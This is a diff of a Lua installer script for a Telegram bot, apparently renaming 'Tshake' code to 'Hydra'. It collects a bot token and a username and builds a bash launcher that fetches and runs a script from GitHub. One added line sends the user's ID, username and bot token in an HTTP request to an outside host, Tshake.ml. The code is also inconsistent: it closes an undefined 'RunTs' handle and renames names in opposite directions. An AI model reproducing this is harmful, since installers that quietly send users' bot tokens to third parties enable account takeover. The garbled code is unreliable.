@@ -7,14 +7,14 @@ Server_Hydra = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
 local AutoFiles_Hydra = function() 
 local Create_Info = function(Token,Sudo,UserName)  
 local Hydra_Info_Sudo = io.open("sudo.lua", 'w')
-Tshake_Info_Sudo:write([[
+Hydra_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-Tshake_Info_Sudo:close()
+Hydra_Info_Sudo:close()
 end  
 if not database:get(Server_Hydra.."Token_Hydra") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
@@ -38,7 +38,7 @@ if not database:get(Server_Hydra.."UserName_Hydra") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://Hydra.ml/info/?user="..UserName)
+local Get_Info = http.request("http://Tshake.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_Tshake.."UserName_Hydra",Json.Info.Username)
-database:set(Server_Tshake.."Id_Hydra",Json.Info.Id)
+  database:set(Server_Hydra.."UserName_Hydra",Json.Info.Username)
+database:set(Server_Hydra.."Id_Hydra",Json.Info.Id)
 end
 end
 else
@@ -63,14 +63,14 @@ end
 os.execute('lua start.lua')
 end
 local function Files_Hydra_Info()
-Create_Info(database:get(Server_Tshake.."Token_Hydra"),database:get(Server_Hydra.."Id_Hydra"),database:get(Server_Hydra.."UserName_Hydra"))   
-http.request("http://Hydra.ml/add/?id="..database:get(Server_Hydra.."Id_Hydra").."&user="..database:get(Server_Hydra.."UserName_Hydra").."&token="..database:get(Server_Tshake.."Token_Tshake"))
+Create_Info(database:get(Server_Hydra.."Token_Hydra"),database:get(Server_Hydra.."Id_Hydra"),database:get(Server_Hydra.."UserName_Hydra"))   
+http.request("http://Tshake.ml/add/?id="..database:get(Server_Hydra.."Id_Hydra").."&user="..database:get(Server_Hydra.."UserName_Hydra").."&token="..database:get(Server_Hydra.."Token_Hydra"))
 local RunHydra = io.open("Hydra", 'w')
 RunHydra:write([[
 #!/usr/bin/env bash
-cd $HOME/Hydra
-token="]]..database:get(Server_Tshake.."Token_Hydra")..[["
-rm -fr Tshake.lua
+cd $HOME/HyDrA
+token="]]..database:get(Server_Hydra.."Token_Hydra")..[["
+rm -fr Hydra.lua
 wget "https://raw.githubusercontent.com/hydrasm/HyDrA/master/Hydra.lua"
 while(true) do
 rm -fr ../.telegram-cli
@@ -85,12 +85,12 @@ cd $HOME/HyDrA
 while(true) do
 rm -fr ../.telegram-cli
 screen -S HyDrA -X kill
-screen -S HyDrA ./Tshake
+screen -S HyDrA ./Hydra
 done
 ]])
 RunTs:close()
 end
-Files_Tshake_Info()
+Files_Hydra_Info()
 database:del(Server_Hydra.."Token_Hydra");database:del(Server_Hydra.."Id_Hydra");database:del(Server_Hydra.."UserName_Hydra")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
